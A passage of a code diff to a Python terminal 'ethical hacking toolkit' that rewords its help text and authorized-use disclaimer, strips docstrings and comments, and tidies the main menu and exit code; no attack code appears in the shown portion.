-- OSINT module provides basic domain intelligence without requiring API keys
-- Username Enumeration helps in reconnaissance during social engineering assessments
-- Service Enumeration identifies potential attack vectors
-- Payload Generation creates basic testing payloads for authorized security assessments
+- Use Network Scanning to identify active hosts on a network before further enumeration.
+- OSINT module provides basic domain intelligence without requiring API keys.
+- Username Enumeration aids reconnaissance for social engineering assessments.
+- Service Enumeration identifies potential attack vectors.
+- Payload Generation creates basic testing payloads for authorized security assessments.
 
 ## Disclaimer
 This tool is designed for ethical security testing only. 
-Use only on systems you have permission to test.
-Unauthorized testing of systems is illegal and unethical.
+Use it only on systems you have permission to test.
+Unauthorized testing is illegal and unethical.
 """
-
     console.print(Markdown(help_text))
     input(f"\n[{NordColors.FROST_2}]Press Enter to continue...[/]")
 
@@ -1428,12 +1223,10 @@ Unauthorized testing of systems is illegal and unethical.
 # Signal Handling and Cleanup
 # ----------------------------------------------------------------
 def cleanup() -> None:
-    """Clean up resources before exiting."""
     print_message("Cleaning up resources...", NordColors.FROST_3)
 
 
 def signal_handler(sig: int, frame: Any) -> None:
-    """Handle interrupt signals."""
     try:
         sig_name = signal.Signals(sig).name
         print_warning(f"Process interrupted by {sig_name}")
@@ -1452,11 +1245,8 @@ atexit.register(cleanup)
 # Main Menu and Entry Point
 # ----------------------------------------------------------------
 def display_main_menu() -> None:
-    """Display the main menu."""
     console.clear()
     console.print(create_header())
-
-    # Display current time and hostname
     current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     console.print(
         Align.center(
@@ -1464,13 +1254,10 @@ def display_main_menu() -> None:
         )
     )
     console.print()
-
-    # Display menu options
     table = Table(show_header=False, box=None)
     table.add_column("Option", style=f"bold {NordColors.FROST_2}", width=6)
     table.add_column("Module", style=NordColors.SNOW_STORM_1, width=30)
     table.add_column("Description", style=NordColors.SNOW_STORM_2)
-
     table.add_row(
         "1",
         f"[bold {NordColors.RECONNAISSANCE}]Network Scanning[/]",
@@ -1505,27 +1292,23 @@ def display_main_menu() -> None:
         "7", f"[bold {NordColors.UTILITIES}]Help[/]", "Display help and documentation"
     )
     table.add_row("0", "Exit", "Exit the application")
-
     console.print(table)
 
 
 def main() -> None:
-    """Main application entry point."""
     try:
         print_message(
             f"Starting {AppConfig.APP_NAME} v{AppConfig.VERSION}", NordColors.GREEN
         )
-
         while True:
             display_main_menu()
             choice = get_integer_input("Enter your choice", 0, 7)
-
             if choice == 0:
                 console.clear()
                 console.print(
                     Panel(
                         Text(
-                            "Thank you for using Python Ethical Hacking Toolkit!",
+                            f"Thank you for using {AppConfig.APP_NAME}!",
                             style=f"bold {NordColors.FROST_2}",
                         ),
                         border_style=NordColors.FROST_1,
@@ -1548,7 +1331,6 @@ def main() -> None:
                 settings_module()
             elif choice == 7:
                 display_help()
-
     except KeyboardInterrupt:
         print_warning("Operation cancelled by user")
         display_panel("Operation cancelled", NordColors.YELLOW, "Cancelled")
